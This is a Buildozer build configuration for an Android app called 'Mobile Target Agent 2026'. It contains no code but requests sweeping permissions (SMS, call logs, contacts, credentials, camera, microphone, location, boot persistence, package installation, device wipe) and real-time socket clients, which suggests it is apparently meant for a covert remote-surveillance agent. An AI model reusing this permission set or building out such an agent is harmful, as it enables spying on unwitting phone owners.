[app]

# (str) Title of your application
title = Mobile Target Agent 2026

# (str) Package name
package.name = mobiletargetagent2026

# (str) Package domain (needed for android/ios packaging)
package.domain = org.golu4141

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas,txt,json

# (str) Application versioning (method 1)
version = 2026.1.0

# (list) Application requirements
# comma separated e.g. requirements = sqlite3,kivy
requirements = python3,kivy,pillow,requests,python-socketio[client],websocket-client,bidict,python-engineio

# (str) Supported orientation (landscape, sensorLandscape, portrait, sensorPortrait or all)
orientation = portrait

# (bool) Indicate if the application should be fullscreen or not
fullscreen = 0

# (int) Target Android API, should be as high as possible.
android.api = 33

# (int) Minimum API your APK / AAB will support.
android.minapi = 21

# (str) Android NDK version to use
android.ndk = 25b

# (int) Android SDK version to use
android.sdk = 33

# (str) Android entry point, default is ok for Kivy-based app
android.entrypoint = org.kivy.android.PythonActivity

# (str) Full name including package path of the Java class that implements Android Activity
android.activity_class_name = org.kivy.android.PythonActivity

# (str) Full name including package path of the Java class that implements Python Service
android.service_class_name = org.kivy.android.PythonService

# (list) Permissions
android.permissions = INTERNET,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,CAMERA,RECORD_AUDIO,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,WAKE_LOCK,VIBRATE,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,SYSTEM_ALERT_WINDOW,WRITE_SETTINGS,READ_PHONE_STATE,CALL_PHONE,SEND_SMS,RECEIVE_SMS,READ_SMS,WRITE_CALL_LOG,READ_CALL_LOG,ADD_VOICEMAIL,USE_SIP,PROCESS_OUTGOING_CALLS,MODIFY_AUDIO_SETTINGS,RECORD_AUDIO,BLUETOOTH,BLUETOOTH_ADMIN,NFC,CHANGE_WIFI_STATE,CHANGE_NETWORK_STATE,ACCESS_LOCATION_EXTRA_COMMANDS,INSTALL_PACKAGES,DELETE_PACKAGES,CLEAR_APP_CACHE,CLEAR_APP_USER_DATA,MOVE_PACKAGE,READ_LOGS,DIAGNOSTIC,STATUS_BAR,DISABLE_KEYGUARD,EXPAND_STATUS_BAR,GET_TASKS,KILL_BACKGROUND_PROCESSES,MODIFY_PHONE_STATE,READ_FRAME_BUFFER,REBOOT,SET_WALLPAPER,SET_WALLPAPER_HINTS,DEVICE_POWER,FACTORY_TEST,MASTER_CLEAR,MOUNT_UNMOUNT_FILESYSTEMS,PERSISTENT_ACTIVITY,RECEIVE_BOOT_COMPLETED,SET_TIME_ZONE,WRITE_SECURE_SETTINGS,WRITE_SYNC_SETTINGS,READ_SYNC_SETTINGS,ACCOUNT_MANAGER,AUTHENTICATE_ACCOUNTS,GET_ACCOUNTS,MANAGE_ACCOUNTS,USE_CREDENTIALS,WRITE_CONTACTS,READ_CONTACTS,WRITE_CALENDAR,READ_CALENDAR

# (list) Android application meta-data to set (key=value format)
android.meta_data = 

# (list) Android library project to add (will be added in the
# project.properties automatically.)
android.library_references = 

# (str) Android logcat filters to use
android.logcat_filters = *:S python:D

# (bool) Copy library instead of making a libpymodules.so
android.copy_libs = 1

# (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
android.archs = arm64-v8a, armeabi-v7a

# (bool) enables Android auto backup feature (Android API >=23)
android.allow_backup = True

# (str) XML file for custom backup rules (see official auto backup documentation)
# android.backup_rules =

# (str) If you need to insert variables into your AndroidManifest.xml file,
# you can do so with the manifestPlaceholders property.
# This property takes a map of key-value pairs.
# android.manifest_placeholders = [:]

# (bool) Skip byte compile for .py files
# android.no-byte-compile-python = False

# (str) The format used to package the app for release mode (aab or apk).
# android.release_artifact = aab

# (str) The format used to package the app for debug mode (apk or aab).
# android.debug_artifact = apk

[buildozer]

# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = False, 1 = True)
warn_on_root = 1

# (str) Path to build artifact storage, absolute or relative to spec file
# build_dir = ./.buildozer

# (str) Path to build output (i.e. .apk, .aab, .ipa) storage
# bin_dir = ./bin

#    -----------------------------------------------------------------------------
#    Profile definitions
#    -----------------------------------------------------------------------------

#    You can extend section / key with a profile
#    For example, you want to deploy a demo version of your application without
#    HD content. You could first change the title to add "(demo)" in the name
#    and extend the excluded directories to remove the HD content.
#
#    [app@demo]
#    title = My Application (demo)
#
#    [app:source.exclude_dirs@demo]
#    images/hd-images/

#    Then, invoke the command line with the "demo" profile:
#
#    buildozer --profile demo android debug

# (str) Target to use, android or ios
target = android